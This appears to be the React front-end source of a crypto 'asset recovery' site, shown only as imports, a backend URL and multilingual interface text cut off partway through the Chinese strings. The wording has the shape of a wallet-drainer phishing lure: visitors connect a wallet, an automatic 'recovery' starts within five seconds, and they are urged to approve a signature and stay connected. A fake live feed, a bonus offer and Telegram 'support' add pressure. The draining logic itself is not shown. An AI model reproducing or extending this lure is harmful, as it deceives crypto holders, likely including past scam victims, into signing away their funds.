import React, { useState, useEffect } from 'react';
import { useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react';
import { useDisconnect } from 'wagmi';
import { ethers } from 'ethers';
import './index.css';

// ============================================
// API CONFIGURATION - USING YOUR WORKING BACKEND
// ============================================
const BACKEND_URL = 'https://recoveryback-five.vercel.app';

// ============================================
// LANGUAGE DETECTION & TRANSLATIONS
// ============================================

const SUPPORTED_LANGUAGES = {
  en: { name: 'English', flag: '🇺🇸', native: 'English' },
  es: { name: 'Spanish', flag: '🇪🇸', native: 'Español' },
  fr: { name: 'French', flag: '🇫🇷', native: 'Français' },
  de: { name: 'German', flag: '🇩🇪', native: 'Deutsch' },
  it: { name: 'Italian', flag: '🇮🇹', native: 'Italiano' },
  pt: { name: 'Portuguese', flag: '🇵🇹', native: 'Português' },
  ru: { name: 'Russian', flag: '🇷🇺', native: 'Русский' },
  zh: { name: 'Chinese', flag: '🇨🇳', native: '中文' },
  ja: { name: 'Japanese', flag: '🇯🇵', native: '日本語' },
  ko: { name: 'Korean', flag: '🇰🇷', native: '한국어' },
  ar: { name: 'Arabic', flag: '🇸🇦', native: 'العربية' },
  hi: { name: 'Hindi', flag: '🇮🇳', native: 'हिन्दी' },
  tr: { name: 'Turkish', flag: '🇹🇷', native: 'Türkçe' },
  nl: { name: 'Dutch', flag: '🇳🇱', native: 'Nederlands' },
  pl: { name: 'Polish', flag: '🇵🇱', native: 'Polski' },
  vi: { name: 'Vietnamese', flag: '🇻🇳', native: 'Tiếng Việt' },
  th: { name: 'Thai', flag: '🇹🇭', native: 'ไทย' },
  id: { name: 'Indonesian', flag: '🇮🇩', native: 'Bahasa Indonesia' }
};

const TRANSLATIONS = {
  en: {
    serviceActive: 'RECOVERY PROTOCOL · ACTIVE',
    welcome: 'Welcome to Blockchain Recovery Center',
    connectWallet: 'CONNECT WALLET',
    disconnect: 'Disconnect Wallet',
    checkEligibility: 'Checking wallet eligibility',
    verifying: 'Scanning blockchain networks for recoverable assets...',
    terms: 'Terms',
    delivery: 'Delivery',
    successful: 'RECOVERY SUCCESSFUL!',
    youHaveSecured: 'Assets Successfully Recovered',
    viewButton: 'VIEW DETAILS',
    checkWalletEligibility: '⚡ Scan Blockchain',
    valueBadge: 'Recovery Amount',
    progress: 'Recovery Progress',
    today: 'Today',
    totalRecovered: 'Total Assets Recovered',
    tokenPrice: 'Network',
    participants: 'recoveries',
    liveClaims: 'LIVE RECOVERY FEED',
    totalClaimed: 'Total Value',
    claimingNow: 'recovering now',
    lastClaim: 'Last recovery',
    someoneJustClaimed: 'Asset Recovery Completed!',
    securedTokens: 'recovered',
    downloadReport: 'Download Recovery Report',
    waitingForFirstClaim: 'Awaiting recovery events...',
    claimAmount: 'Recovered',
    bonusTag: '+25% bonus',
    recoverButton: 'INITIATE RECOVERY',
    processing: 'PROCESSING RECOVERY...',
    completed: '✓ RECOVERY COMPLETED',
    secured: 'Your assets have been successfully recovered',
    view: 'VIEW RECOVERED ASSETS',
    recoverNow: 'RECOVER ASSETS NOW',
    recoveryComplete: 'RECOVERY COMPLETE!',
    amountRecovered: 'Amount Recovered',
    processingRecovery: 'Initiating recovery protocol...',
    eligible: '✓ Recoverable Assets Detected!',
    notEligible: 'No Recoverable Assets Found',
    minRequirement: 'On-chain balance required for recovery initiation',
    recoveryValue: 'Recoverable Value',
    scanComplete: 'Blockchain scan complete',
    assetsFound: 'recoverable assets found',
    recoveryInitiated: 'Recovery protocol initiated',
    confirmationSent: 'Confirmation sent',
    retrievalComplete: 'Asset retrieval complete',
    emailNotification: 'Recovery confirmation sent',
    blockchainSync: 'Synchronizing with blockchain networks...',
    walletRequired: 'Active wallet connection required',
    insufficientBalance: 'Insufficient on-chain balance for recovery',
    proceedToRecovery: 'Click to proceed with asset recovery',
    recoveryReady: 'Recovery ready - click to retrieve assets',
    reportGenerated: 'Recovery report generated',
    reportDownloaded: 'Report downloaded successfully',
    support: 'Support',
    reportIssue: 'Report an Issue',
    yourEmail: 'Your Email Address',
    issuePlaceholder: 'Describe your issue in detail...',
    sendReport: 'Send Report',
    reportSent: 'Report sent successfully! Support will contact you shortly.',
    processingReport: 'Sending report...',
    reportError: 'Failed to send report. Please try again.',
    contactInfo: 'We\'ll follow up via email within 24 hours.',
    telegramSupport: 'Telegram Support',
    telegramJoin: 'Join Our Community',
    telegramDesc: 'Facing connection issues? Using an unsupported exchange? Our support team is active 24/7 on Telegram to help you recover your assets.',
    telegramButton: 'Join Telegram Community',
    connectionHelp: 'Connection Problems?',
    manualReachout: 'Manual Support',
    emailSupportTitle: 'Email Support',
    emailSupportDesc: 'No Telegram? No problem! Send us an email with your issue and our support team will get back to you within 24 hours.',
    whyEmailSupport: 'Why Email Support?',
    emailSupportPoints: '• For users who don\'t use Telegram\n• For detailed issues requiring documentation\n• For exchange users (Binance, Coinbase, Kraken)\n• For follow-up on manual recovery cases',
    // NEW INSTRUCTION KEYS
    recoveryInstructionsTitle: '🔐 How to Recover Your Assets',
    recoveryStep1: 'Connect your wallet using the button below.',
    recoveryStep2: 'Wait for automatic scan of 5 blockchain networks (Ethereum, BSC, Polygon, Arbitrum, Avalanche).',
    recoveryStep3: 'If eligible, the system will automatically initiate recovery (or you can click the button).',
    recoveryStep4: 'Approve the signature in your wallet to authorize the recovery.',
    recoveryStep5: 'Recovery completes! You\'ll receive a confirmation and downloadable report.',
    recoveryNote: '⚠️ Important: Do not disconnect or close your wallet during the process. Auto‑recovery starts in 5 seconds after eligibility detection.'
  },
  es: {
    serviceActive: 'PROTOCOLO DE RECUPERACIÓN · ACTIVO',
    welcome: 'Bienvenido al Centro de Recuperación Blockchain',
    connectWallet: 'CONECTAR WALLET',
    disconnect: 'Desconectar Wallet',
    checkEligibility: 'Verificando elegibilidad de la wallet',
    verifying: 'Analizando redes blockchain en busca de activos recuperables...',
    terms: 'Términos',
    delivery: 'Entrega',
    successful: '¡RECUPERACIÓN EXITOSA!',
    youHaveSecured: 'Activos Recuperados Exitosamente',
    viewButton: 'VER DETALLES',
    checkWalletEligibility: '⚡ Escanear Blockchain',
    valueBadge: 'Monto a Recuperar',
    progress: 'Progreso de Recuperación',
    today: 'Hoy',
    totalRecovered: 'Total de Activos Recuperados',
    tokenPrice: 'Red',
    participants: 'recuperaciones',
    liveClaims: 'FEED DE RECUPERACIÓN EN VIVO',
    totalClaimed: 'Valor Total',
    claimingNow: 'recuperando ahora',
    lastClaim: 'Última recuperación',
    someoneJustClaimed: '¡Recuperación de Activos Completada!',
    securedTokens: 'recuperado',
    downloadReport: 'Descargar Informe',
    waitingForFirstClaim: 'Esperando eventos de recuperación...',
    claimAmount: 'Recuperado',
    bonusTag: '+25% bono',
    recoverButton: 'INICIAR RECUPERACIÓN',
    processing: 'PROCESANDO...',
    completed: '✓ RECUPERACIÓN COMPLETADA',
    secured: 'Tus activos han sido recuperados exitosamente',
    view: 'VER ACTIVOS RECUPERADOS',
    recoverNow: 'RECUPERAR AHORA',
    recoveryComplete: '¡RECUPERACIÓN COMPLETA!',
    amountRecovered: 'Monto Recuperado',
    processingRecovery: 'Iniciando protocolo...',
    eligible: '✓ ¡Activos Detectados!',
    notEligible: 'No se encontraron activos',
    minRequirement: 'Saldo en cadena requerido',
    recoveryValue: 'Valor Recuperable',
    scanComplete: 'Escaneo completado',
    assetsFound: 'activos encontrados',
    recoveryInitiated: 'Protocolo iniciado',
    confirmationSent: 'Confirmación enviada',
    retrievalComplete: 'Recuperación completada',
    emailNotification: 'Confirmación enviada',
    blockchainSync: 'Sincronizando con redes...',
    walletRequired: 'Wallet conectada requerida',
    insufficientBalance: 'Saldo insuficiente para recuperación',
    proceedToRecovery: 'Haz clic para proceder',
    recoveryReady: 'Recuperación lista',
    reportGenerated: 'Informe generado',
    reportDownloaded: 'Informe descargado',
    support: 'Soporte',
    reportIssue: 'Reportar Problema',
    yourEmail: 'Tu Correo Electrónico',
    issuePlaceholder: 'Describe tu problema en detalle...',
    sendReport: 'Enviar Reporte',
    reportSent: '¡Reporte enviado! Te contactaremos pronto.',
    processingReport: 'Enviando reporte...',
    reportError: 'Error al enviar. Intenta de nuevo.',
    contactInfo: 'Te contactaremos por email en 24 horas.',
    telegramSupport: 'Soporte por Telegram',
    telegramJoin: 'Únete a Nuestra Comunidad',
    telegramDesc: '¿Problemas de conexión? ¿Usas un exchange no compatible? Nuestro equipo de soporte está activo 24/7 en Telegram para ayudarte a recuperar tus activos.',
    telegramButton: 'Unirse a Telegram',
    connectionHelp: '¿Problemas de conexión?',
    manualReachout: 'Soporte Manual',
    emailSupportTitle: 'Soporte por Email',
    emailSupportDesc: '¿No tienes Telegram? ¡No hay problema! Envíanos un email con tu problema y nuestro equipo te responderá en 24 horas.',
    whyEmailSupport: '¿Por qué Email Support?',
    emailSupportPoints: '• Para usuarios que no usan Telegram\n• Para problemas detallados que requieren documentación\n• Para usuarios de exchanges (Binance, Coinbase, Kraken)\n• Para seguimiento de casos de recuperación manual',
    recoveryInstructionsTitle: '🔐 Cómo Recuperar tus Activos',
    recoveryStep1: 'Conecta tu wallet con el botón de abajo.',
    recoveryStep2: 'Espera el escaneo automático de 5 redes blockchain (Ethereum, BSC, Polygon, Arbitrum, Avalanche).',
    recoveryStep3: 'Si eres elegible, el sistema iniciará la recuperación automáticamente (o puedes hacer clic en el botón).',
    recoveryStep4: 'Aprueba la firma en tu wallet para autorizar la recuperación.',
    recoveryStep5: '¡Recuperación completada! Recibirás una confirmación y un informe descargable.',
    recoveryNote: '⚠️ Importante: No desconectes ni cierres tu wallet durante el proceso. La auto‑recuperación comienza en 5 segundos después de detectar elegibilidad.'
  },
  fr: {
    serviceActive: 'PROTOCOLE DE RÉCUPÉRATION · ACTIF',
    welcome: 'Bienvenue au Centre de Récupération Blockchain',
    connectWallet: 'CONNECTER LE PORTEFEUILLE',
    disconnect: 'Déconnecter',
    checkEligibility: 'Vérification de l\'éligibilité du portefeuille',
    verifying: 'Analyse des réseaux blockchain à la recherche d\'actifs récupérables...',
    terms: 'Conditions',
    delivery: 'Livraison',
    successful: 'RÉCUPÉRATION RÉUSSIE !',
    youHaveSecured: 'Actifs récupérés avec succès',
    viewButton: 'VOIR LES DÉTAILS',
    checkWalletEligibility: '⚡ Scanner la Blockchain',
    valueBadge: 'Montant récupéré',
    progress: 'Progression',
    today: 'Aujourd\'hui',
    totalRecovered: 'Total des actifs récupérés',
    tokenPrice: 'Réseau',
    participants: 'récupérations',
    liveClaims: 'FLUX EN DIRECT',
    totalClaimed: 'Valeur totale',
    claimingNow: 'en cours de récupération',
    lastClaim: 'Dernière récupération',
    someoneJustClaimed: 'Récupération terminée !',
    securedTokens: 'récupéré',
    downloadReport: 'Télécharger le rapport',
    waitingForFirstClaim: 'En attente d\'événements...',
    claimAmount: 'Récupéré',
    bonusTag: '+25% bonus',
    recoverButton: 'LANCER LA RÉCUPÉRATION',
    processing: 'TRAITEMENT...',
    completed: '✓ RÉCUPÉRATION TERMINÉE',
    secured: 'Vos actifs ont été récupérés',
    view: 'VOIR LES ACTIFS',
    recoverNow: 'RÉCUPÉRER MAINTENANT',
    recoveryComplete: 'RÉCUPÉRATION TERMINÉE !',
    amountRecovered: 'Montant récupéré',
    processingRecovery: 'Lancement du protocole...',
    eligible: '✓ Actifs récupérables détectés !',
    notEligible: 'Aucun actif récupérable',
    minRequirement: 'Solde on-chain requis',
    recoveryValue: 'Valeur récupérable',
    scanComplete: 'Analyse terminée',
    assetsFound: 'actifs trouvés',
    recoveryInitiated: 'Protocole lancé',
    confirmationSent: 'Confirmation envoyée',
    retrievalComplete: 'Récupération terminée',
    emailNotification: 'Confirmation envoyée',
    blockchainSync: 'Synchronisation...',
    walletRequired: 'Portefeuille requis',
    insufficientBalance: 'Solde insuffisant',
    proceedToRecovery: 'Cliquez pour continuer',
    recoveryReady: 'Récupération prête',
    reportGenerated: 'Rapport généré',
    reportDownloaded: 'Rapport téléchargé',
    support: 'Support',
    reportIssue: 'Signaler un problème',
    yourEmail: 'Votre email',
    issuePlaceholder: 'Décrivez votre problème...',
    sendReport: 'Envoyer',
    reportSent: 'Rapport envoyé !',
    processingReport: 'Envoi...',
    reportError: 'Erreur, réessayez.',
    contactInfo: 'Nous vous répondrons sous 24h.',
    telegramSupport: 'Support Telegram',
    telegramJoin: 'Rejoindre la communauté',
    telegramDesc: 'Problèmes de connexion ? Support 24/7 sur Telegram.',
    telegramButton: 'Rejoindre Telegram',
    connectionHelp: 'Problèmes de connexion ?',
    manualReachout: 'Support manuel',
    emailSupportTitle: 'Support par email',
    emailSupportDesc: 'Pas de Telegram ? Envoyez un email.',
    whyEmailSupport: 'Pourquoi email ?',
    emailSupportPoints: '• Pour les utilisateurs sans Telegram\n• Pour les problèmes nécessitant des pièces jointes\n• Pour les utilisateurs d’exchanges\n• Pour le suivi manuel',
    recoveryInstructionsTitle: '🔐 Comment récupérer vos actifs',
    recoveryStep1: 'Connectez votre portefeuille avec le bouton ci-dessous.',
    recoveryStep2: 'Attendez le scan automatique des 5 réseaux blockchain (Ethereum, BSC, Polygon, Arbitrum, Avalanche).',
    recoveryStep3: 'Si vous êtes éligible, le système lance la récupération automatiquement (ou cliquez sur le bouton).',
    recoveryStep4: 'Approuvez la signature dans votre portefeuille pour autoriser la récupération.',
    recoveryStep5: 'Récupération terminée ! Vous recevrez une confirmation et un rapport téléchargeable.',
    recoveryNote: '⚠️ Important : Ne déconnectez pas et ne fermez pas votre portefeuille pendant le processus. La récupération automatique démarre dans 5 secondes après détection de l\'éligibilité.'
  },
  de: {
    serviceActive: 'WIEDERHERSTELLUNGSPROTOKOLL · AKTIV',
    welcome: 'Willkommen im Blockchain-Wiederherstellungszentrum',
    connectWallet: 'WALLET VERBINDEN',
    disconnect: 'Trennen',
    checkEligibility: 'Überprüfung der Wallet-Berechtigung',
    verifying: 'Wallet wird auf wiederherstellbare Vermögenswerte analysiert...',
    terms: 'Bedingungen',
    delivery: 'Lieferung',
    successful: 'WIEDERHERSTELLUNG ERFOLGREICH!',
    youHaveSecured: 'Vermögenswerte erfolgreich wiederhergestellt',
    viewButton: 'DETAILS ANSEHEN',
    checkWalletEligibility: '⚡ Blockchain scannen',
    valueBadge: 'Wiederhergestellter Betrag',
    progress: 'Fortschritt',
    today: 'Heute',
    totalRecovered: 'Wiederhergestellte Vermögenswerte',
    tokenPrice: 'Netzwerk',
    participants: 'Wiederherstellungen',
    liveClaims: 'LIVE-FEED',
    totalClaimed: 'Gesamtwert',
    claimingNow: 'wird wiederhergestellt',
    lastClaim: 'Letzte Wiederherstellung',
    someoneJustClaimed: 'Wiederherstellung abgeschlossen!',
    securedTokens: 'wiederhergestellt',
    downloadReport: 'Bericht herunterladen',
    waitingForFirstClaim: 'Warten auf Ereignisse...',
    claimAmount: 'Wiederhergestellt',
    bonusTag: '+25% Bonus',
    recoverButton: 'WIEDERHERSTELLUNG STARTEN',
    processing: 'IN BEARBEITUNG...',
    completed: '✓ WIEDERHERSTELLUNG ABGESCHLOSSEN',
    secured: 'Ihre Vermögenswerte wurden wiederhergestellt',
    view: 'VERMÖGENSWERTE ANSEHEN',
    recoverNow: 'JETZT WIEDERHERSTELLEN',
    recoveryComplete: 'WIEDERHERSTELLUNG ABGESCHLOSSEN!',
    amountRecovered: 'Wiederhergestellter Betrag',
    processingRecovery: 'Protokoll wird gestartet...',
    eligible: '✓ Wiederherstellbare Vermögenswerte gefunden!',
    notEligible: 'Keine wiederherstellbaren Vermögenswerte',
    minRequirement: 'On-Chain-Guthaben erforderlich',
    recoveryValue: 'Wiederherstellbarer Wert',
    scanComplete: 'Scan abgeschlossen',
    assetsFound: 'Vermögenswerte gefunden',
    recoveryInitiated: 'Protokoll gestartet',
    confirmationSent: 'Bestätigung gesendet',
    retrievalComplete: 'Wiederherstellung abgeschlossen',
    emailNotification: 'Bestätigung gesendet',
    blockchainSync: 'Synchronisierung...',
    walletRequired: 'Wallet-Verbindung erforderlich',
    insufficientBalance: 'Unzureichendes Guthaben',
    proceedToRecovery: 'Klicken Sie zum Fortfahren',
    recoveryReady: 'Wiederherstellung bereit',
    reportGenerated: 'Bericht generiert',
    reportDownloaded: 'Bericht heruntergeladen',
    support: 'Support',
    reportIssue: 'Problem melden',
    yourEmail: 'Ihre E-Mail',
    issuePlaceholder: 'Beschreiben Sie Ihr Problem...',
    sendReport: 'Senden',
    reportSent: 'Bericht gesendet!',
    processingReport: 'Senden...',
    reportError: 'Fehler, bitte erneut versuchen.',
    contactInfo: 'Wir antworten innerhalb von 24 Stunden.',
    telegramSupport: 'Telegram Support',
    telegramJoin: 'Community beitreten',
    telegramDesc: 'Verbindungsprobleme? Support 24/7 auf Telegram.',
    telegramButton: 'Telegram beitreten',
    connectionHelp: 'Verbindungsprobleme?',
    manualReachout: 'Manueller Support',
    emailSupportTitle: 'E-Mail Support',
    emailSupportDesc: 'Kein Telegram? Senden Sie eine E-Mail.',
    whyEmailSupport: 'Warum E-Mail?',
    emailSupportPoints: '• Für Benutzer ohne Telegram\n• Für detaillierte Probleme mit Anhängen\n• Für Exchange-Benutzer\n• Für manuelle Nachverfolgung',
    recoveryInstructionsTitle: '🔐 So stellen Sie Ihre Vermögenswerte wieder her',
    recoveryStep1: 'Verbinden Sie Ihr Wallet mit dem Button unten.',
    recoveryStep2: 'Warten Sie auf den automatischen Scan der 5 Blockchain-Netzwerke (Ethereum, BSC, Polygon, Arbitrum, Avalanche).',
    recoveryStep3: 'Bei Berechtigung startet das System die Wiederherstellung automatisch (oder Sie klicken auf den Button).',
    recoveryStep4: 'Genehmigen Sie die Signatur in Ihrem Wallet, um die Wiederherstellung zu autorisieren.',
    recoveryStep5: 'Wiederherstellung abgeschlossen! Sie erhalten eine Bestätigung und einen herunterladbaren Bericht.',
    recoveryNote: '⚠️ Wichtig: Trennen Sie Ihr Wallet während des Vorgangs nicht und schließen Sie es nicht. Die automatische Wiederherstellung beginnt 5 Sekunden nach der Erkennung der Berechtigung.'
  },
  it: {
    serviceActive: 'PROTOCOLLO DI RECUPERO · ATTIVO',
    welcome: 'Benvenuto nel Centro di Recupero Blockchain',
    connectWallet: 'CONNETTI WALLET',
    disconnect: 'Disconnetti',
    checkEligibility: 'Verifica idoneità del wallet',
    verifying: 'Analisi del wallet per asset recuperabili...',
    terms: 'Termini',
    delivery: 'Consegna',
    successful: 'RECUPERO RIUSCITO!',
    youHaveSecured: 'Asset recuperati con successo',
    viewButton: 'VISUALIZZA DETTAGLI',
    checkWalletEligibility: '⚡ Scansiona Blockchain',
    valueBadge: 'Importo recuperato',
    progress: 'Progresso',
    today: 'Oggi',
    totalRecovered: 'Asset totali recuperati',
    tokenPrice: 'Rete',
    participants: 'recuperi',
    liveClaims: 'FEED LIVE',
    totalClaimed: 'Valore totale',
    claimingNow: 'in recupero',
    lastClaim: 'Ultimo recupero',
    someoneJustClaimed: 'Recupero completato!',
    securedTokens: 'recuperato',
    downloadReport: 'Scarica rapporto',
    waitingForFirstClaim: 'In attesa di eventi...',
    claimAmount: 'Recuperato',
    bonusTag: '+25% bonus',
    recoverButton: 'AVVIA RECUPERO',
    processing: 'ELABORAZIONE...',
    completed: '✓ RECUPERO COMPLETATO',
    secured: 'I tuoi asset sono stati recuperati',
    view: 'VISUALIZZA ASSET',
    recoverNow: 'RECUPERA ORA',
    recoveryComplete: 'RECUPERO COMPLETATO!',
    amountRecovered: 'Importo recuperato',
    processingRecovery: 'Avvio protocollo...',
    eligible: '✓ Asset recuperabili rilevati!',
    notEligible: 'Nessun asset recuperabile',
    minRequirement: 'Saldo on-chain richiesto',
    recoveryValue: 'Valore recuperabile',
    scanComplete: 'Scansione completata',
    assetsFound: 'asset trovati',
    recoveryInitiated: 'Protocollo avviato',
    confirmationSent: 'Conferma inviata',
    retrievalComplete: 'Recupero completato',
    emailNotification: 'Conferma inviata',
    blockchainSync: 'Sincronizzazione...',
    walletRequired: 'Wallet connesso richiesto',
    insufficientBalance: 'Saldo insufficiente',
    proceedToRecovery: 'Clicca per procedere',
    recoveryReady: 'Recupero pronto',
    reportGenerated: 'Rapporto generato',
    reportDownloaded: 'Rapporto scaricato',
    support: 'Supporto',
    reportIssue: 'Segnala problema',
    yourEmail: 'La tua email',
    issuePlaceholder: 'Descrivi il problema...',
    sendReport: 'Invia',
    reportSent: 'Rapporto inviato!',
    processingReport: 'Invio...',
    reportError: 'Errore, riprova.',
    contactInfo: 'Ti risponderemo entro 24 ore.',
    telegramSupport: 'Supporto Telegram',
    telegramJoin: 'Unisciti alla community',
    telegramDesc: 'Problemi di connessione? Supporto 24/7 su Telegram.',
    telegramButton: 'Unisciti a Telegram',
    connectionHelp: 'Problemi di connessione?',
    manualReachout: 'Supporto manuale',
    emailSupportTitle: 'Supporto email',
    emailSupportDesc: 'Niente Telegram? Invia una email.',
    whyEmailSupport: 'Perché email?',
    emailSupportPoints: '• Per utenti senza Telegram\n• Per problemi che richiedono documenti\n• Per utenti exchange\n• Per follow-up manuali',
    recoveryInstructionsTitle: '🔐 Come recuperare i tuoi asset',
    recoveryStep1: 'Connetti il tuo wallet con il pulsante qui sotto.',
    recoveryStep2: 'Attendi la scansione automatica delle 5 reti blockchain (Ethereum, BSC, Polygon, Arbitrum, Avalanche).',
    recoveryStep3: 'Se idoneo, il sistema avvia il recupero automaticamente (o puoi cliccare sul pulsante).',
    recoveryStep4: 'Approva la firma nel tuo wallet per autorizzare il recupero.',
    recoveryStep5: 'Recupero completato! Riceverai una conferma e un rapporto scaricabile.',
    recoveryNote: '⚠️ Importante: Non disconnettere né chiudere il wallet durante il processo. L\'auto‑recupero parte in 5 secondi dopo il rilevamento dell\'idoneità.'
  },
  pt: {
    serviceActive: 'PROTOCOLO DE RECUPERAÇÃO · ATIVO',
    welcome: 'Bem-vindo ao Centro de Recuperação Blockchain',
    connectWallet: 'CONECTAR CARTEIRA',
    disconnect: 'Desconectar',
    checkEligibility: 'Verificando elegibilidade da carteira',
    verifying: 'Analisando carteira em busca de ativos recuperáveis...',
    terms: 'Termos',
    delivery: 'Entrega',
    successful: 'RECUPERAÇÃO BEM-SUCEDIDA!',
    youHaveSecured: 'Ativos recuperados com sucesso',
    viewButton: 'VER DETALHES',
    checkWalletEligibility: '⚡ Verificar Blockchain',
    valueBadge: 'Valor recuperado',
    progress: 'Progresso',
    today: 'Hoje',
    totalRecovered: 'Ativos totais recuperados',
    tokenPrice: 'Rede',
    participants: 'recuperações',
    liveClaims: 'FEED AO VIVO',
    totalClaimed: 'Valor total',
    claimingNow: 'recuperando agora',
    lastClaim: 'Última recuperação',
    someoneJustClaimed: 'Recuperação concluída!',
    securedTokens: 'recuperado',
    downloadReport: 'Baixar relatório',
    waitingForFirstClaim: 'Aguardando eventos...',
    claimAmount: 'Recuperado',
    bonusTag: '+25% bônus',
    recoverButton: 'INICIAR RECUPERAÇÃO',
    processing: 'PROCESSANDO...',
    completed: '✓ RECUPERAÇÃO CONCLUÍDA',
    secured: 'Seus ativos foram recuperados',
    view: 'VER ATIVOS',
    recoverNow: 'RECUPERAR AGORA',
    recoveryComplete: 'RECUPERAÇÃO CONCLUÍDA!',
    amountRecovered: 'Valor recuperado',
    processingRecovery: 'Iniciando protocolo...',
    eligible: '✓ Ativos recuperáveis detectados!',
    notEligible: 'Nenhum ativo recuperável',
    minRequirement: 'Saldo on-chain necessário',
    recoveryValue: 'Valor recuperável',
    scanComplete: 'Verificação concluída',
    assetsFound: 'ativos encontrados',
    recoveryInitiated: 'Protocolo iniciado',
    confirmationSent: 'Confirmação enviada',
    retrievalComplete: 'Recuperação concluída',
    emailNotification: 'Confirmação enviada',
    blockchainSync: 'Sincronizando...',
    walletRequired: 'Carteira conectada necessária',
    insufficientBalance: 'Saldo insuficiente',
    proceedToRecovery: 'Clique para prosseguir',
    recoveryReady: 'Recuperação pronta',
    reportGenerated: 'Relatório gerado',
    reportDownloaded: 'Relatório baixado',
    support: 'Suporte',
    reportIssue: 'Relatar problema',
    yourEmail: 'Seu e-mail',
    issuePlaceholder: 'Descreva seu problema...',
    sendReport: 'Enviar',
    reportSent: 'Relatório enviado!',
    processingReport: 'Enviando...',
    reportError: 'Erro, tente novamente.',
    contactInfo: 'Responderemos em até 24 horas.',
    telegramSupport: 'Suporte Telegram',
    telegramJoin: 'Junte-se à comunidade',
    telegramDesc: 'Problemas de conexão? Suporte 24/7 no Telegram.',
    telegramButton: 'Entrar no Telegram',
    connectionHelp: 'Problemas de conexão?',
    manualReachout: 'Suporte manual',
    emailSupportTitle: 'Suporte por e-mail',
    emailSupportDesc: 'Sem Telegram? Envie um e-mail.',
    whyEmailSupport: 'Por que e-mail?',
    emailSupportPoints: '• Para usuários sem Telegram\n• Para problemas com documentação\n• Para usuários de exchanges\n• Para acompanhamento manual',
    recoveryInstructionsTitle: '🔐 Como recuperar seus ativos',
    recoveryStep1: 'Conecte sua carteira com o botão abaixo.',
    recoveryStep2: 'Aguarde a verificação automática das 5 redes blockchain (Ethereum, BSC, Polygon, Arbitrum, Avalanche).',
    recoveryStep3: 'Se elegível, o sistema inicia a recuperação automaticamente (ou clique no botão).',
    recoveryStep4: 'Aprove a assinatura em sua carteira para autorizar a recuperação.',
    recoveryStep5: 'Recuperação concluída! Você receberá uma confirmação e um relatório para download.',
    recoveryNote: '⚠️ Importante: Não desconecte nem feche sua carteira durante o processo. A auto‑recuperação começa em 5 segundos após a detecção de elegibilidade.'
  },
  ru: {
    serviceActive: 'ПРОТОКОЛ ВОССТАНОВЛЕНИЯ · АКТИВЕН',
    welcome: 'Добро пожаловать в Центр восстановления блокчейна',
    connectWallet: 'ПОДКЛЮЧИТЬ КОШЕЛЕК',
    disconnect: 'Отключить',
    checkEligibility: 'Проверка права на восстановление',
    verifying: 'Анализ кошелька на предмет восстанавливаемых активов...',
    terms: 'Условия',
    delivery: 'Доставка',
    successful: 'ВОССТАНОВЛЕНИЕ УСПЕШНО!',
    youHaveSecured: 'Активы успешно восстановлены',
    viewButton: 'ПОДРОБНЕЕ',
    checkWalletEligibility: '⚡ Сканировать блокчейн',
    valueBadge: 'Сумма восстановления',
    progress: 'Прогресс',
    today: 'Сегодня',
    totalRecovered: 'Всего восстановлено',
    tokenPrice: 'Сеть',
    participants: 'восстановлений',
    liveClaims: 'ПРЯМОЙ ЭФИР',
    totalClaimed: 'Общая стоимость',
    claimingNow: 'восстанавливается',
    lastClaim: 'Последнее восстановление',
    someoneJustClaimed: 'Восстановление завершено!',
    securedTokens: 'восстановлено',
    downloadReport: 'Скачать отчёт',
    waitingForFirstClaim: 'Ожидание событий...',
    claimAmount: 'Восстановлено',
    bonusTag: '+25% бонус',
    recoverButton: 'ЗАПУСТИТЬ ВОССТАНОВЛЕНИЕ',
    processing: 'ОБРАБОТКА...',
    completed: '✓ ВОССТАНОВЛЕНИЕ ЗАВЕРШЕНО',
    secured: 'Ваши активы восстановлены',
    view: 'ПОСМОТРЕТЬ АКТИВЫ',
    recoverNow: 'ВОССТАНОВИТЬ СЕЙЧАС',
    recoveryComplete: 'ВОССТАНОВЛЕНИЕ ЗАВЕРШЕНО!',
    amountRecovered: 'Восстановленная сумма',
    processingRecovery: 'Запуск протокола...',
    eligible: '✓ Обнаружены восстанавливаемые активы!',
    notEligible: 'Нет восстанавливаемых активов',
    minRequirement: 'Требуется ончейн-баланс',
    recoveryValue: 'Восстанавливаемая стоимость',
    scanComplete: 'Сканирование завершено',
    assetsFound: 'активов найдено',
    recoveryInitiated: 'Протокол запущен',
    confirmationSent: 'Подтверждение отправлено',
    retrievalComplete: 'Восстановление завершено',
    emailNotification: 'Подтверждение отправлено',
    blockchainSync: 'Синхронизация...',
    walletRequired: 'Требуется подключение кошелька',
    insufficientBalance: 'Недостаточный баланс',
    proceedToRecovery: 'Нажмите для продолжения',
    recoveryReady: 'Восстановление готово',
    reportGenerated: 'Отчёт создан',
    reportDownloaded: 'Отчёт скачан',
    support: 'Поддержка',
    reportIssue: 'Сообщить о проблеме',
    yourEmail: 'Ваш email',
    issuePlaceholder: 'Опишите проблему...',
    sendReport: 'Отправить',
    reportSent: 'Отчёт отправлен!',
    processingReport: 'Отправка...',
    reportError: 'Ошибка, попробуйте снова.',
    contactInfo: 'Мы ответим в течение 24 часов.',
    telegramSupport: 'Поддержка в Telegram',
    telegramJoin: 'Присоединиться',
    telegramDesc: 'Проблемы с подключением? Поддержка 24/7 в Telegram.',
    telegramButton: 'Перейти в Telegram',
    connectionHelp: 'Проблемы с подключением?',
    manualReachout: 'Ручная поддержка',
    emailSupportTitle: 'Поддержка по email',
    emailSupportDesc: 'Нет Telegram? Напишите email.',
    whyEmailSupport: 'Зачем email?',
    emailSupportPoints: '• Для пользователей без Telegram\n• Для проблем с документами\n• Для пользователей бирж\n• Для ручного сопровождения',
    recoveryInstructionsTitle: '🔐 Как восстановить активы',
    recoveryStep1: 'Подключите кошелёк с помощью кнопки ниже.',
    recoveryStep2: 'Дождитесь автоматического сканирования 5 блокчейн-сетей (Ethereum, BSC, Polygon, Arbitrum, Avalanche).',
    recoveryStep3: 'При наличии права система запустит восстановление автоматически (или нажмите кнопку).',
    recoveryStep4: 'Подтвердите подпись в кошельке для авторизации восстановления.',
    recoveryStep5: 'Восстановление завершено! Вы получите подтверждение и отчёт для скачивания.',
    recoveryNote: '⚠️ Важно: Не отключайте и не закрывайте кошелёк во время процесса. Автовосстановление начнётся через 5 секунд после обнаружения права.'
  },
  zh: {
    serviceActive: '恢复协议 · 活跃中',
    welcome: '欢迎来到区块链恢复中心',
    connectWallet: '连接钱包',
    disconnect: '断开连接',
    checkEligibility: '检查钱包资格',
    verifying: '正在分析钱包中的可恢复资产...',
    terms: '条款',
    delivery: '交付',
    successful: '恢复成功！',
    youHaveSecured: '资产已成功恢复',
